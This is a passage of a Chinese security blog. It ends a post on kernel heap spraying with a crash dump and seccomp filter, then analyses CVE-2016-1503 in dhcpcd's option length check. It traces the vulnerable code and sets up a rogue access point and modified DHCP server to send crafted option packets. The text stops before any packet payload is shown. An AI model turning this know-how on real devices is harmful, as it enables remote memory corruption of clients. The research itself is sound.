Tainted: G        W    3.10.73-g9b6596d #1</div><div class="line">[  127.245337] task: ffffffc0a9554080 ti: ffffffc050834000 task.ti: ffffffc050834000</div><div class="line">[  127.245350] PC is at msm_iommu_map_range+0x8c/0x344</div><div class="line">[  127.245356] LR is at msm_iommu_map_range+0x6c/0x344</div><div class="line">[  127.245361] pc : [&lt;ffffffc0009f7c40&gt;] lr : [&lt;ffffffc0009f7c20&gt;] pstate: 80000145</div><div class="line">[  127.245365] sp : ffffffc050837b60</div><div class="line">[  127.245370] x29: ffffffc050837b60 x28: ffffffc050834000 </div><div class="line">[  127.245378] x27: 0000000000000001 x26: 0000000000000000 </div><div class="line">[  127.245386] x25: ffffffc050837bf0 x24: 0000000000100000 </div><div class="line">[  127.245394] x23: 00000000e8000000 x22: ffffffc001afe000 </div><div class="line">[  127.245402] x21: 000000017fff0000 x20: ffffffc0b87a9580 </div><div class="line">[  127.245410] x19: 0000000000100000 x18: ffffffc050837968 </div><div class="line">[  127.245419] x17: 0000000000000001 x16: ffffffc000233af8 </div><div class="line">[  127.245427] x15: 0000000000000000 x14: 0ffffffffffffffe </div><div class="line">[  127.245435] x13: 0000000000000030 x12: 0101010101010101 </div><div class="line">[  127.245443] x11: 7f7f7f7f7f7f7f7f x10: 7757597353435251 </div><div class="line">[  127.245451] x9 : ffffffc050837890 x8 : 001d1649d2b64000 </div><div class="line">[  127.245459] x7 : 0000000000000018 x6 : ffffffc0009f7bb4 </div><div class="line">[  127.245468] x5 : ffffffc0b87a9580 x4 : 0000000000000000 </div><div class="line">[  127.245475] x3 : 0000000000000000 x2 : ffffffc0b9e63418 </div><div class="line">[  127.245484] x1 : ffffffc0b9ebc818 x0 : 0000000000000012 </div><div class="line"> </div><div class="line">struct sock_filter filter[] = &#123;  </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">      &#125;;</div><div class="line">#define         BPF_RET         0x06</div><div class="line">#define         BPF_K           0x00</div><div class="line">#define SECCOMP_RET_ALLOW  0x7fff0000U /* allow */</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>折腾了很久，终于堆喷成功。多看代码，多尝试，多坚持。</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/06/06/CVE-2016-1503 漏洞分析/">
  <time datetime="2016-06-06T04:23:00.000Z">
    2016-06-06
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/06/06/CVE-2016-1503 漏洞分析/">CVE-2016-1503 漏洞分析</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h1 id="CVE-2016-1503-漏洞分析"><a href="#CVE-2016-1503-漏洞分析" class="headerlink" title="CVE-2016-1503 漏洞分析"></a>CVE-2016-1503 漏洞分析</h1><h2 id="一、漏洞成因"><a href="#一、漏洞成因" class="headerlink" title="一、漏洞成因"></a>一、漏洞成因</h2><p>首先来看一下官方的描述：<br>    “A vulnerability in the Dynamic Host Configuration Protocol service could enable an attacker to cause memory corruption, which could lead to remote code execution.”<br>    攻击者可能会通过动态主机配置协议服务中的漏洞破坏内存，从而执行远程代码。</p>
<p>Diff：<br><img src="http://img.blog.csdn.net/20170116120936119?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>从官方打下的Patch来看，主要的区别是一个连续的if语句改成了互斥的if else语句，另外一个关键就是之前可以返回除了0或者-1之外的其他值，而patch之后只能返回0或者-1.<br>    通过以上的分析，可以确定了具体的漏洞原因就是dhcpcd在解析options的时候长度dl的校验出现了问题，导致了后续的远程执行漏洞。</p>
<h2 id="二、函数追踪"><a href="#二、函数追踪" class="headerlink" title="二、函数追踪"></a>二、函数追踪</h2><pre><code>定位一下该patch的地方可以得知该Patch的位置在文件dhcp.c中的valid_length(uint8_t option, int dl, int *type)函数里，查找一下valid_length 的引用有一处,是在文件dhcp.c中的get_option(const struct dhcp_message *dhcp, uint8_t opt, int *len, int *type)函数，如下：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">get_option(const struct dhcp_message *dhcp, uint8_t opt, int *len, int *type)</div><div class="line">&#123;</div><div class="line">	const uint8_t *p = dhcp-&gt;options;</div><div class="line">	const uint8_t *e = p + sizeof(dhcp-&gt;options);</div><div class="line">	uint8_t l, ol = 0;</div><div class="line">	uint8_t o = 0;</div><div class="line">	uint8_t overl = 0;</div><div class="line">	uint8_t *bp = NULL;</div><div class="line">	const uint8_t *op = NULL;</div><div class="line">	int bl = 0;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line"></div><div class="line">	if (valid_length(opt, bl, type) == -1) &#123;</div><div class="line">		errno = EINVAL;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line">	if (len)</div><div class="line">		*len = bl;</div><div class="line">	if (bp) &#123;</div><div class="line">		memcpy(bp, op, ol);</div><div class="line">		return (const uint8_t *)opt_buffer;</div><div class="line">	&#125;</div><div class="line">	if (op)</div><div class="line">		return op;</div><div class="line">	errno = ENOENT;</div><div class="line">	return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从代码可以看到，只要返回值不为-1，即可通过options的长度校验，也就是说，只要dl % sz 不等于-1即可。sz是根据option的类型来确定，根据不同的类型来取不同的值，如果是UINT32，sz则为4；如果是UINT16，sz则为2，如果是UINIT8，sz则为1。而在valid_length函数中的dl其实就是get_option函数中的bl，这个值是服务器发出来的数据包中单个option的长度。在校验完bl的长度后，将会把这个bl的值赋给get_option函数中的第三个参数<em>len。<br>    接下来我们继续追踪这个指针len，查找get_option函数的引用，在dhcp.c文件中一共有7处，排除之后找到configure_env(char **env, const char </em>prefix, const struct dhcp_message <em>dhcp, const struct if_options </em>ifo)函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">configure_env(char **env, const char *prefix, const struct dhcp_message *dhcp,</div><div class="line">    const struct if_options *ifo)</div><div class="line">&#123;</div><div class="line">	unsigned int i;</div><div class="line">	const uint8_t *p;</div><div class="line">	int pl;</div><div class="line">	struct in_addr addr;</div><div class="line">	struct in_addr net;</div><div class="line">	struct in_addr brd;</div><div class="line">	char *val, *v;</div><div class="line">	const struct dhcp_opt *opt;</div><div class="line">	ssize_t len, e = 0;</div><div class="line">	char **ep;</div><div class="line">	char cidr[4];</div><div class="line">	uint8_t overl = 0;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line">	//循环读取options</div><div class="line">	for (opt = dhcp_opts; opt-&gt;option; opt++) &#123;</div><div class="line">		if (!opt-&gt;var)</div><div class="line">			continue;</div><div class="line">		if (has_option_mask(ifo-&gt;nomask, opt-&gt;option))</div><div class="line">			continue;</div><div class="line">		val = NULL;</div><div class="line">		p = get_option(dhcp, opt-&gt;option, &amp;pl, NULL);</div><div class="line">		if (!p)</div><div class="line">			continue;</div><div class="line">		/* We only want the FQDN name */</div><div class="line">		if (opt-&gt;option == DHO_FQDN) &#123;</div><div class="line">			p += 3;</div><div class="line">			pl -= 3;</div><div class="line">		&#125;</div><div class="line">		len = print_option(NULL, 0, opt-&gt;type, pl, p);</div><div class="line">		if (len &lt; 0)</div><div class="line">			return -1;</div><div class="line">		e = strlen(prefix) + strlen(opt-&gt;var) + len + 4;</div><div class="line">		v = val = *ep++ = xmalloc(e);</div><div class="line">		v += snprintf(val, e, &quot;%s_%s=&quot;, prefix, opt-&gt;var);</div><div class="line">		if (len != 0)</div><div class="line">			print_option(v, len, opt-&gt;type, pl, p);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return ep - env;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从以上代码可以看到，之前的校验出现了问题的bl，其实赋值给了pl，而pl在configure_env函数中为一个局部变量，在调用get_option 函数给pl赋值后，后来又2次调用print_option函数，并传入了pl参数。接下来就是来跟踪一下这个pl的值，查看print_option(char <em>s, ssize_t len, int type, int dl, const uint8_t </em>data)函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">print_option(char *s, ssize_t len, int type, int dl, const uint8_t *data)</div><div class="line">&#123;</div><div class="line">	const uint8_t *e, *t;</div><div class="line">	uint16_t u16;</div><div class="line">	int16_t s16;</div><div class="line">	uint32_t u32;</div><div class="line">	int32_t s32;</div><div class="line">	struct in_addr addr;</div><div class="line">	ssize_t bytes = 0;</div><div class="line">	ssize_t l;</div><div class="line">	char *tmp;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line"></div><div class="line">	if (!s) &#123;</div><div class="line">		if (type &amp; UINT8)</div><div class="line">			l = 3;</div><div class="line">		else if (type &amp; UINT16) &#123;</div><div class="line">			l = 5;</div><div class="line">			dl /= 2;</div><div class="line">		&#125; else if (type &amp; SINT16) &#123;</div><div class="line">			l = 6;</div><div class="line">			dl /= 2;</div><div class="line">		&#125; else if (type &amp; UINT32) &#123;</div><div class="line">			l = 10;</div><div class="line">			dl /= 4;</div><div class="line">		&#125; else if (type &amp; SINT32) &#123;</div><div class="line">			l = 11;</div><div class="line">			dl /= 4;</div><div class="line">		&#125; else if (type &amp; IPV4) &#123;</div><div class="line">			l = 16;</div><div class="line">			dl /= 4;</div><div class="line">		&#125; else &#123;</div><div class="line">			errno = EINVAL;</div><div class="line">			return -1;</div><div class="line">		&#125;</div><div class="line">		return (l + 1) * dl; //第一次调用 print_option在这里返回</div><div class="line">	&#125;</div><div class="line">//第二次调用 print_option函数才可以到这里</div><div class="line">	t = data;</div><div class="line">	e = data + dl;</div><div class="line">	while (data &lt; e) &#123;</div><div class="line">		if (data != t) &#123;</div><div class="line">			*s++ = &apos; &apos;;</div><div class="line">			bytes++;</div><div class="line">			len--;</div><div class="line">		&#125;</div><div class="line">		if (type &amp; UINT8) &#123;</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, *data);</div><div class="line">			data++;</div><div class="line">		&#125; else if (type &amp; UINT16) &#123;</div><div class="line">			memcpy(&amp;u16, data, sizeof(u16));</div><div class="line">			u16 = ntohs(u16);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, u16);</div><div class="line">			data += sizeof(u16);</div><div class="line">		&#125; else if (type &amp; SINT16) &#123;</div><div class="line">			memcpy(&amp;s16, data, sizeof(s16));</div><div class="line">			s16 = ntohs(s16);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, s16);</div><div class="line">			data += sizeof(s16);</div><div class="line">		&#125; else if (type &amp; UINT32) &#123;</div><div class="line">			memcpy(&amp;u32, data, sizeof(u32));</div><div class="line">			u32 = ntohl(u32);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, u32);</div><div class="line">			data += sizeof(u32);</div><div class="line">		&#125; else if (type &amp; SINT32) &#123;</div><div class="line">			memcpy(&amp;s32, data, sizeof(s32));</div><div class="line">			s32 = ntohl(s32);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, s32);</div><div class="line">			data += sizeof(s32);</div><div class="line">		&#125; else if (type &amp; IPV4) &#123;</div><div class="line">			memcpy(&amp;addr.s_addr, data, sizeof(addr.s_addr));</div><div class="line">			l = snprintf(s, len, &quot;%s&quot;, inet_ntoa(addr));</div><div class="line">			data += sizeof(addr.s_addr);</div><div class="line">		&#125; else</div><div class="line">			l = 0;</div><div class="line">		if (len &lt;= l) &#123;</div><div class="line">			bytes += len;</div><div class="line">			break;</div><div class="line">		&#125;</div><div class="line">		len -= l;</div><div class="line">		bytes += l;</div><div class="line">		s += l;</div><div class="line">	&#125;</div><div class="line">	return bytes;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从上述的代码可以看到，第一次的调用将会在”return (l + 1) * dl ”这里返回，并且会返回一个len作为第二次调用的第二个参数再次传入print_option函数。第二次调用print_option函数的时候，dl的值影响了while循环，这个循环在第一次调用print_option函数是无法进入的。<br>    分析到这里，可以推断之前在valid_length函数中未合理校验的dl值传入到了此while循环中，正是由于之前的校验不够完整使得在此while循环中dl的值不合法，最终导致了该漏洞的形成。<br>整个在客户端的过程如图所示：</p>
<p><img src="http://img.blog.csdn.net/20170116121406215?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h2 id="三、测试环境的搭建"><a href="#三、测试环境的搭建" class="headerlink" title="三、测试环境的搭建"></a>三、测试环境的搭建</h2><pre><code>由于该漏洞的特殊性，需要开启一个热点，搭建一个Dhcpd服务器以及一个带log的dhcpcd的客户端来验证此漏洞，这里选用的系统为Ubuntu14.04。
</code></pre><p>3.1 Hostapd热点的搭建</p>
<p>安装Hostapd：<br>sudo apt-get install hostapd</p>
<p>安装了软件以后，在/etc/hostapd文件夹中建立一个hostapd.conf的文件，在里面写入接入点的信息。<br>配置Hostapd：<br>sudo nano /etc/hostapd/hostapd.conf</p>
<p>hostapd.conf文件改成如下：</p>
<hr>
<p>interface=wlan0//改成对应的网卡<br>driver=nl80211//这个driver一定得是这个<br>ssid=baobaonihao<br>hw_mode=g<br>channel=10<br>macaddr_acl=0<br>auth_algs=3<br>wpa=2<br>wpa_passphrase=qqqq1111<br>wpa_key_mgmt=WPA-PSK<br>wpa_pairwise=TKIP CCMP<br>rsn_pairwise=TKIP CCMP</p>
<hr>
<p>注意要自己设置其中的无线热点名称ssid和认证密码wpa_passphrase。</p>
<pre><code>上述配置完成以后，在终端执行sudo hostapd /etc/hostapd/hostapd.conf -B(-B是需要在后台运行的时候添加)，到这里，就表明Hostapd的安装和配置结束了，现在已经可以在手机终端上可以搜索到这个baobaonihao 的热点了，但是无法连接到这个热点，此时应该出现的情况是：正在获取IP地址，但是一直获取不到。这是由于dhcpd服务器没搭建好的原因，接下来就是dhcpd服务器的搭建。
</code></pre><p>3.2 Dhcpd服务器的编译与搭建<br>    这个dhcpd服务器不能直接用apt-get来安装，可以在官网<a href="https://www.isc.org/" target="_blank" rel="external">https://www.isc.org/</a> 里面找到源码并且下载，进行编译安装。<br>    下载之后为一个dhcp-4.3.4.tar.gz包。<br>安装官方原始版本如下：<br>tar zxvf dhcp-4.3.4.tar.gz</p>
<p>cd dhcp-4.3.4</p>
<p>chmod 777 configure</p>
<p>sudo ./configure</p>
<p>sudo make </p>
<p>sudo make install</p>
<p>安装debug版本如下，debug版本能输出log，在之后的构建package中方便查看调试以及log信息：</p>
<p>tar zxvf dhcp-4.3.4.tar.gz</p>
<p>cd dhcp-4.3.4</p>
<p>chmod 777 configure</p>
<p>sudo ./configure –enable-debug</p>
<p>sudo make </p>
<p>sudo make install</p>
<p>这样就可以编译安装一个调试版本了。</p>
<p>同样的，安装了软件以后，在/etc/dhcp文件夹中建立一个dhcpd.conf的配置文件，在里面写入dhcpd的配置信息。</p>
<p>dhcpd.conf文件改成如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">************************</div><div class="line">ddns-update-style none;</div><div class="line">log-facility local7;</div><div class="line"></div><div class="line">subnet 172.20.94.0 netmask 255.255.255.0 &#123;</div><div class="line">        option routers                  172.20.94.1;</div><div class="line">        option subnet-mask              255.255.255.0;</div><div class="line">        option broadcast-address        172.20.94.255;</div><div class="line">	option domain-name &quot;internal.baidu.com&quot;;</div><div class="line">        option domain-name-servers      172.22.1.253,172.22.1.254;</div><div class="line">        option ntp-servers              172.20.94.1;</div><div class="line">        option netbios-name-servers     172.20.94.1;</div><div class="line">        option netbios-node-type 2;</div><div class="line">        default-lease-time 86400;</div><div class="line">        max-lease-time 86400;</div><div class="line">	range 172.20.94.0 172.20.94.100;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上述配置完成以后我们需要手动给wlan0配置IP地址并且启动它，在终端输入：</p>
<p>sudo ifconfig wlan0 172.20.94.1 </p>
<p>sudo dhcpd /etc/dhcp/dhcpd.conf</p>
<p>就可以启动dhcpd了，此时可以获取到ip地址了，已经可以成功发包了，如果要上网，则还要输入以下命令：</p>
<p>开启内核IP转发<br>bash -c “echo 1 &gt; /proc/sys/net/ipv4/ip_forward”<br> 开启防火墙NAT转发(如果本机使用eth0上网,则把ppp0改为eth0)<br>iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE</p>
<p>这样Dhcpd服务器的编译与搭建到此就完成了，以及可以修改源码取任意构造数据包了。</p>
<p>3.3 Dhcpcd客户端增加log编译。<br>    采用4.4.4版本的源码来编译<br>log函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">void MYLOG(const char* ms, ...);</div><div class="line">void MYLOG(const char* ms, ...)  </div><div class="line">&#123;  </div><div class="line">    char wzLog[1024] = &#123;0&#125;;  </div><div class="line">    char buffer[1024] = &#123;0&#125;;  </div><div class="line">    va_list args;  </div><div class="line">    va_start(args, ms);  </div><div class="line">    vsprintf( wzLog ,ms,args);  </div><div class="line">    va_end(args);  </div><div class="line"> </div><div class="line">    time_t now;  </div><div class="line">    time(&amp;now);  </div><div class="line">    struct tm *local;  </div><div class="line">    local = localtime(&amp;now);  </div><div class="line">    sprintf(buffer,&quot;%04d-%02d-%02d %02d:%02d:%02d %s\n&quot;, local-&gt;tm_year+1900, local-&gt;tm_mon,  </div><div class="line">                local-&gt;tm_mday, local-&gt;tm_hour, local-&gt;tm_min, local-&gt;tm_sec,  </div><div class="line">                wzLog);  </div><div class="line">    FILE* file = fopen(&quot;/data/local/tmp/dhcplog&quot;,&quot;a+&quot;);  </div><div class="line">    fwrite(buffer,1,strlen(buffer),file);  </div><div class="line">    fclose(file);  </div><div class="line"> </div><div class="line">  // syslog(LOG_INFO,wzLog);  </div><div class="line">    return ;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译的话直接make即可编译</p>
<h2 id="四、dhcp发包交互过程"><a href="#四、dhcp发包交互过程" class="headerlink" title="四、dhcp发包交互过程"></a>四、dhcp发包交互过程</h2><pre><code>要想触发该漏洞，当然得了解dhcp服务器与客户端之间的交互。那它们之间是怎么样交互的呢？    DHCP协议采用UDP作为传输协议，主机发送请求消息到DHCP服务器的67号端口，DHCP服务器回应应答消息给主机的68号端口。
</code></pre><p>DHCP Client以广播的方式发出DHCP Discover报文。</p>
<p>所有的DHCP Server都能够接收到DHCP Client发送的DHCP Discover报文，所有的DHCP Server都会给出响应，向DHCP Client发送一个DHCP Offer报文。<br>DHCP Offer报文中“Your(Client) IP Address”字段就是DHCP Server能够提供给DHCP Client使用的IP地址，且DHCP Server会将自己的IP地址放在“option”字段中以便DHCP Client区分不同的DHCP Server。DHCP Server在发出此报文后会存在一个已分配IP地址的纪录。</p>
<p>DHCP Client只能处理其中的一个DHCP Offer报文，一般的原则是DHCP Client处理最先收到的DHCP Offer报文。<br>DHCP Client会发出一个广播的DHCP Request报文，在选项字段中会加入选中的DHCP Server的IP地址和需要的IP地址。</p>
<p>DHCP Server收到DHCP Request报文后，判断选项字段中的IP地址是否与自己的地址相同。如果不相同，DHCP Server不做任何处理只清除相应IP地址分配记录；如果相同，DHCP Server就会向DHCP Client响应一个DHCP ACK报文，并在选项字段中增加IP地址的使用租期信息。</p>
<p>DHCP Client接收到DHCP ACK报文后，检查DHCP Server分配的IP地址是否能够使用。如果可以使用，则DHCP Client成功获得IP地址并根据IP地址使用租期自动启动续延过程；如果DHCP Client发现分配的IP地址已经被使用，则DHCP Client向DHCPServer发出DHCP Decline报文，通知DHCP Server禁用这个IP地址，然后DHCP Client开始新的地址申请过程。</p>
<p>DHCP Client在成功获取IP地址后，随时可以通过发送DHCP Release报文释放自己的IP地址，DHCP Server收到DHCP Release报文后，会回收相应的IP地址并重新分配。</p>
<pre><code>可以得知DHCP  Server会向DHCP Client响应一个DHCP ACK报文，而这个ACK报文能触发到漏洞代码片段，而需要知道的就是如何构建自己的DHCP ACK报文。查看Server端的代码，找到处理客户端报文的函数为void dhcp (struct packet *packet) ，代码片段如下：
</code></pre><p><img src="http://img.blog.csdn.net/20170116121803638?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>对应的ACK 报文当然是DHCPREQUEST，继续查看dhcprequest函数，在结尾处找到:<br><img src="http://img.blog.csdn.net/20170116121838920?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>可以发现，是ack_lease (packet, lease, DHCPACK, 0, msgbuf, ms_nulltp,(struct host_decl *)0);这个函数，继续追踪，还是在尾部：</p>
<p><img src="http://img.blog.csdn.net/20170116121907092?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>进入dhcp_reply(lease),继续追踪：</p>
<p><img src="http://img.blog.csdn.net/20170116121937643?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>进入cons_options函数，还是在函数的尾部发现：<br>    memcpy(outpacket-&gt;options, buffer, index);</p>
<pre><code>length = DHCP_FIXED_NON_UDP + index;

return length;


这里的buffer就是储存数据包中options字段的地方了，在这个memcpy之前改写这个buffer，再对应的把index改成数据包中options字段实际的长度就可以了。
</code></pre><h2 id="五、发包验证"><a href="#五、发包验证" class="headerlink" title="五、发包验证"></a>五、发包验证</h2><pre><code>可以先发个包熟悉一下格式是什么样的（Hex格式）：
</code></pre><p><img src="http://img.blog.csdn.net/20170116122048373?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>表示的是一个完整的DHCP ACK 数据包，这个数据包的格式如下：<br>0                   1                   2                   3<br>   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<br>   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>   |     op (1)    |   htype (1)   |   hlen (1)    |   hops (1)    |<br>   +—————+—————+—————+—————+<br>   |                            xid (4)                            |<br>   +——————————-+——————————-+<br>   |           secs (2)            |           flags (2)           |<br>   +——————————-+——————————-+<br>   |                          ciaddr  (4)                          |<br>   +—————————————————————+<br>   |                          yiaddr  (4)                          |<br>   +—————————————————————+<br>   |                          siaddr  (4)                          |<br>   +—————————————————————+<br>   |                          giaddr  (4)                          |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          chaddr  (16)                         |<br>   |                                                               |<br>   |                                                               |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          sname   (64)                         |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          file    (128)                        |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          options (variable)                   |<br>   +—————————————————————+</p>
<p>具体参数含义请参考rfc2131[1]文档，这里关注的是最后一个字段options，这个字段就是导致漏洞触发的关键点。</p>
<p>为了顺利的利用长度校验不合理的这个缺陷，可以把opt-&gt;type设置成UINT16和ARRAY，查找一下这种type的option在客户端的源码对应的option号码，如下：<br><img src="http://img.blog.csdn.net/20170116122204084?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>option的号码为25，为了清楚25这个option的格式，查看rfc2132[2]文档找到描述如下：</p>
<p>4.7. Path MTU Plateau Table Option</p>
